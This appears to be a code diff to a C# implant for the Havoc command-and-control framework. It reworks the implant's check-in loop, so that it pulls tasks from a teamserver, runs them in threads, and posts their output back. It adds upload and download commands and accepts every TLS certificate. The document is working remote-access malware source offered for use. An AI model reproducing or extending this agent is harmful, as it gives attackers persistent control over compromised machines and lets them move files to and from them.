@@ -69,21 +69,7 @@ namespace HavocImplant
             while (true)
             {
                 Console.WriteLine($"Failed Checkins: {implant.timeoutCounter}");
-
-                string cumalativeOutput = "";
-
-                for (int i = 0; i < implant.taskingInformation.Count; i++)
-                {
-                    int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
-                    if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
-                    {
-                        Console.WriteLine($"Shipping off Task ID {taskId}");
-                        cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
-                    }
-                    implant.taskingInformation.Remove(taskId);
-                    i--;
-                }
-                string rawTasks = implant.CheckIn(cumalativeOutput);
+                byte[] rawTasks = implant.CheckIn("", "gettask");
 
                 // Chunk of 4 = size = there is a task that is being sent to implant
                 if (rawTasks.Length > 4)
@@ -94,20 +80,22 @@ namespace HavocImplant
                     // Parsing the raw request from teamserver, splitting task into dictionary entries
                     while (offset < rawTasks.Length)
                     {
-                        
-                        int size = BitConverter.ToInt32(Encoding.UTF8.GetBytes(rawTasks.Substring(offset, 4)), 0); // [4 bytes containing size of task][task]
+                        //byte[] stringAsBytes = Encoding.UTF8.GetBytes(rawTasks);
+
+                        //int size = BitConverter.ToInt32(new List<byte>(stringAsBytes).GetRange(0, 4).ToArray(), 0); // [4 bytes containing size of task][task]
+                        int size = BitConverter.ToInt32(new List<byte>(rawTasks).GetRange(offset, 4).ToArray(), 0); // [4 bytes containing size of task][task]
                         Console.WriteLine($"Task is of size {size}");
-                        if (offset == 0) { task = rawTasks.Substring(offset + 4, size).Trim(); }
-                        else { task = rawTasks.Substring(offset + 4, size).Trim(); }
 
-                        List<byte> cleaning = Encoding.UTF8.GetBytes(task).ToList<byte>();
-                        cleaning.Remove(0x00);
-                        task = Encoding.UTF8.GetString(cleaning.ToArray()).Trim(); // Clear up the funky
+                        string dirtyTask = Encoding.UTF8.GetString(rawTasks, offset + 4, size); // Clear up the funky
+                        List<byte> dirtyArray = Encoding.UTF8.GetBytes(dirtyTask).ToList<byte>();
+                        dirtyArray.RemoveAll(item => item == 0x00);
 
-                        Console.WriteLine("Task is {0}", task);
+                        task = Encoding.UTF8.GetString(dirtyArray.ToArray());
+                        Console.WriteLine($"Task is {task}");
+
                         offset += size + 4;
 
-                        int taskId = rand.Next(10000*10000);
+                        int taskId = rand.Next(10000 * 10000);
                         implant.taskingInformation.Add(taskId, new Implant.task(task, ""));
                         Console.WriteLine("Task has id {0}", taskId);
 
@@ -116,10 +104,9 @@ namespace HavocImplant
                     Console.WriteLine("Task Queue length: {0}", implant.taskingInformation.Count);
 
                     // Parsing the commands from the dictionary
-                    for (int i = 0; i < implant.taskingInformation.Count; i++) 
+                    for (int i = 0; i < implant.taskingInformation.Count; i++)
                     {
                         string command = implant.taskingInformation.Values.ToList<Implant.task>()[i].taskCommand;
-                        Console.WriteLine("Read command: {0}", command);
 
                         int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
                         Console.WriteLine("The ID is: {0}", taskId);
@@ -140,10 +127,32 @@ namespace HavocImplant
                                 Thread lsThread = new Thread(() => AgentFunctions.Ls.Run(implant, command.Substring(2).Trim(), taskId));
                                 lsThread.Start();
                                 break;
+                            case "upload":
+                                Thread uploadThread = new Thread(() => AgentFunctions.Upload.Run(implant, command.Substring(6).Trim(), taskId));
+                                uploadThread.Start();
+                                break;
+                            case "download":
+                                Thread downloadThread = new Thread(() => AgentFunctions.Download.Run(implant, command.Substring(8).Trim(), taskId));
+                                downloadThread.Start();
+                                break;
                         }
                     }
                 }
                 Thread.Sleep(implant.sleepTime);
+                string cumalativeOutput = "";
+
+                for (int i = 0; i < implant.taskingInformation.Count; i++)
+                {
+                    int taskId = implant.taskingInformation.Keys.ToList<int>()[i];
+                    if (!String.IsNullOrEmpty(implant.taskingInformation[taskId].taskOutput))
+                    {
+                        Console.WriteLine($"Shipping off Task ID {taskId}");
+                        cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
+                    }
+                    implant.taskingInformation.Remove(taskId);
+                    i--;
+                }
+                implant.CheckIn(cumalativeOutput, "commandoutput");
             }
         }
         public void Register()
@@ -158,21 +167,18 @@ namespace HavocImplant
             while (!response.Equals("registered"))
             {
                 Console.WriteLine("Trying to register");
-                response = sendReq(registrationRequestBody, agentHeader);
+                response = Encoding.UTF8.GetString(sendReq(registrationRequestBody, agentHeader));
                 Console.WriteLine("Response: {0}", response);
                 Thread.Sleep(sleepTime);
             }
             registered = true;
         }
-        public string CheckIn(string data)
+        public byte[] CheckIn(string data, string checkInType)
         {
-            //Console.WriteLine("Checking in for taskings");
 
-            string checkInRequestBody = "{\"task\": \"gettask\", \"data\": \"{0}\"}".Replace("{0}", Regex.Replace(data, @"\r\n?|\n|\n\r", "\\n"));
-            //string checkInRequestBody = "{\"task\":\"gettask\",\"data\":\"{0}\"}".Replace("{0}", BitConverter.ToString(data));
+            string checkInRequestBody = "{\"task\": \"{1}\", \"data\": \"{0}\"}".Replace("{1}", checkInType).Replace("{0}", Regex.Replace(data, @"\r\n?|\n|\n\r", "\\n"));
             byte[] agentHeader = createHeader(magic, checkInRequestBody);
-            string response = sendReq(checkInRequestBody, agentHeader);
-            //Console.WriteLine("Havoc Response: {0}".Replace("{0}", response));
+            byte[] response = sendReq(checkInRequestBody, agentHeader);
             return response;
 
         }
@@ -183,10 +189,8 @@ namespace HavocImplant
             if (BitConverter.IsLittleEndian)
             {
                 Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
-                //Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
                 Array.Reverse(size_bytes);
             }
-            //else Array.Copy(Encoding.UTF8.GetBytes(size.ToString()), size_bytes, Encoding.UTF8.GetBytes(size.ToString()).Length);
             Array.Copy(BitConverter.GetBytes(size), size_bytes, BitConverter.GetBytes(size).Length);
             byte[] agentHeader = new byte[size_bytes.Length + magic.Length + agentId.Length];
             Array.Copy(size_bytes, 0, agentHeader, 0, size_bytes.Length);
@@ -222,24 +226,22 @@ namespace HavocImplant
             string strPostReq = "{\"task\": \"register\", \"data\": \"{0}\"}".Replace("{0}", strRegistrationAttrsAsJSON);
             return strPostReq;
         }
-        string stringDictionaryToJson(Dictionary<string, string> dict)
+        public static string stringDictionaryToJson(Dictionary<string, string> dict)
         {
             var entries = dict.Select(d =>
                 string.Format("\\\"{0}\\\": \\\"{1}\\\"", d.Key, string.Join(",", d.Value)));
             return "{" + string.Join(",", entries) + "}";
         }
-        public string sendReq(string requestBody, byte[] agentHeader)
+        public byte[] sendReq(string requestBody, byte[] agentHeader)
         {
             bool AcceptAllCertifications(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certification, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
             {
                 return true;
             }
             Random rand = new Random();
-            string responseString = "";
-            ServicePointManager
-    .ServerCertificateValidationCallback +=
-    (sender, cert, chain, sslPolicyErrors) => true;
-            //if (secure) System.Net.ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(AcceptAllCertifications);
+            //string responseString = "";
+            byte[] responseBytes = new byte[] { };
+            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
 
             var request = (HttpWebRequest)WebRequest.Create(url[rand.Next(0, url.Length)]);
 
@@ -263,11 +265,16 @@ namespace HavocImplant
                 }
                 var response = (HttpWebResponse)request.GetResponse();
 
-                byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
-                responseString = Encoding.UTF8.GetString(bytes);
-                if (responseString.Length > 0)
+                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                 {
-                    //outputData = "";
+                    using (var memoryStream = new MemoryStream())
+                    {
+                        response.GetResponseStream().CopyTo(memoryStream);
+                        responseBytes = memoryStream.ToArray();
+                    }
+                }
+                if (responseBytes.Length > 0)
+                {
                     timeoutCounter = 0;
                 }
                 Console.WriteLine("Setting counter to 0");
@@ -278,9 +285,14 @@ namespace HavocImplant
                 if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                 {
                     var response = (HttpWebResponse)ex.Response;
-
-                    byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
-                    responseString = Encoding.UTF8.GetString(bytes);
+                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
+                    {
+                        using (var memoryStream = new MemoryStream())
+                        {
+                            response.GetResponseStream().CopyTo(memoryStream);
+                            responseBytes = memoryStream.ToArray();
+                        }
+                    }
                 }
                 if (ex.Status == WebExceptionStatus.Timeout || ex.Status == WebExceptionStatus.ConnectFailure)
                 {
@@ -290,8 +302,7 @@ namespace HavocImplant
                 Console.WriteLine($"status code: {ex.Status}");
             }
 
-            //outputData = "";
-            return responseString;
+            return responseBytes;
         }
         static string getIPv4()
         {
